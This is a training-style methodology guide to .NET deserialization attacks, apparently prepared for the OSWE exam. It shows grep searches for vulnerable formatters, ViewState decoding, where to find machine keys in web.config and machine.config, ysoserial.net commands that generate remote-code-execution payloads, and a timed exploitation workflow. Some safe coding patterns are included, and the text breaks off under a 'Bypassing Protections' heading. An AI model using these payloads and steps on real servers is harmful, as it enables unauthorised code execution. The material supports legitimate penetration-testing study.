# .NET Deserialization Methodology Guide

## Overview
.NET deserialization vulnerabilities occur when applications deserialize untrusted data using vulnerable formatters. Common in ASP.NET applications with ViewState, cookies, or remoting.

## Part 1: Identifying Deserialization

### Code Patterns (White-box)
```bash
# Search for dangerous formatters
grep -r "BinaryFormatter" .
grep -r "ObjectStateFormatter" .
grep -r "JavaScriptSerializer" .
grep -r "DataContractSerializer" .
```

**Vulnerable Code**:
```csharp
// VULNERABLE - BinaryFormatter
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);

// VULNERABLE - ViewState without validation
ObjectStateFormatter formatter = new ObjectStateFormatter();
object obj = formatter.Deserialize(viewStateString);
```

### Black-box Detection
- Look for ViewState: `id="__VIEWSTATE"` in HTML
- ViewState starts with `/wEP` when base64 encoded
- Check cookies for serialized .NET objects
- Test web services for .NET remoting

## Part 2: ViewState Exploitation

### ViewState Structure
```
Base64(Encrypted(MAC(Serialized(PageState))))
```

**Decoding ViewState**:
```python
import base64
viewstate_b64 = "/wEPDwUKMTU5..."
decoded = base64.b64decode(viewstate_b64)
# First bytes: 0xFF 0x01 (BinaryFormatter magic)
```

### Machine Key Discovery
**Locations**:
1. `web.config` - Hardcoded keys
2. `machine.config` - Server-wide keys
3. Default keys - Some versions have defaults
4. Brute force - Weak or predictable keys

**Example from web.config**:
```xml
<machineKey
  validationKey="ABC123..."
  decryptionKey="DEF456..."
  validation="SHA1"
  decryption="AES"
/>
```

## Part 3: ysoserial.net Usage

### Installation
```bash
# Download from GitHub releases
wget https://github.com/pwntester/ysoserial.net/releases/download/v1.35/ysoserial.net.exe
```

### Basic Usage
```bash
# Generate ViewState payload
ysoserial.net.exe -p ViewState -g ObjectDataProvider -c "calc.exe" \\
  --decryptionalg=AES --decryptionkey=<KEY> \\
  --validationalg=SHA1 --validationkey=<KEY>

# Other formatters
ysoserial.net.exe -p BinaryFormatter -g ObjectDataProvider -c "whoami"
ysoserial.net.exe -p DataContractSerializer -g ObjectDataProvider -c "id"
```

### Available Gadget Chains
- **ObjectDataProvider** - Most reliable, works with multiple formatters
- **PSObject** - PowerShell-based RCE
- **TypeConfuseDelegate** - Type confusion attack
- **WindowsIdentity** - Claims-based attacks

## Part 4: OSWE Exam Strategy

### Code Review Checklist
- [ ] Search for BinaryFormatter, ObjectStateFormatter
- [ ] Check web.config for machine keys
- [ ] Identify ViewState usage in .aspx pages
- [ ] Look for cookie deserialization
- [ ] Check for .NET remoting endpoints

### Exploitation Workflow
1. **Extract ViewState** (2 min) - View page source
2. **Find Machine Keys** (5 min) - Check web.config
3. **Generate Payload** (3 min) - Use ysoserial.net
4. **Deliver & Verify** (5 min) - Submit ViewState, check callback

**Total**: ~15 minutes

### Common Machine Key Locations
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\machine.config
```

## Part 5: Code Review Patterns

### Dangerous Patterns
```csharp
// UNSAFE - No validation
BinaryFormatter bf = new BinaryFormatter();
object o = bf.Deserialize(stream);

// UNSAFE - ViewState without MAC
<pages enableViewStateMac="false" />

// UNSAFE - Hardcoded keys
<machineKey validationKey="ABC..." decryptionKey="DEF..." />
```

### Safe Patterns
```csharp
// SAFE - Use DataContractJsonSerializer
var serializer = new DataContractJsonSerializer(typeof(MyObject));
var obj = serializer.ReadObject(stream);

// SAFE - ViewState with proper MAC
<pages enableViewStateMac="true" viewStateEncryptionMode="Always" />
```

### Bypassing Protections

# Brute force validation key (if short/predictable)
